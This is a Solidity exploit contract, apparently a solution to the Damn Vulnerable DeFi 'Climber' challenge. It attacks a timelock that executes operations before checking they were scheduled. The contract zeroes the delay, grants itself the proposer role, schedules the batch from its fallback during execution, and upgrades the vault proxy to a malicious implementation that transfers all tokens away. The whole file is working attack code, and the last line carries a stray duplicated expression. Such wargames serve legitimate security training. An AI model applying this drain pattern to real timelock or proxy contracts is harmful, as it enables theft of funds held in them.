// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import "./MaliciousImpl.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Attacker {
    ClimberTimelock timelock;
    ERC1967Proxy vault;
    MaliciousImpl impl;
    DamnValuableToken token;
    address recovery;

    bool is_preload = false;

    fallback() external payable {
        bytes32 salt = hex"01";
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);

        timelock.schedule(targets, values, dataElements, salt);
    }

    function attack(ClimberTimelock _timelock, 
                        ERC1967Proxy _vault, 
                        MaliciousImpl _impl, 
                        DamnValuableToken _token, 
                        address _recovery) public {
        bytes32 salt = hex"01";
        timelock = _timelock;
        vault = _vault;
        impl = _impl;
        token = _token;
        recovery = _recovery;
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("attacker_fallback_selector()");

        bytes memory transferBytes = abi.encodeWithSignature("malicious_transfer(address,address)", address(token), recovery);
        dataElements[3] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(impl), transferBytes);
        timelock.execute(targets, values, dataElements, salt);(targets, values, dataElements, salt);
    }

}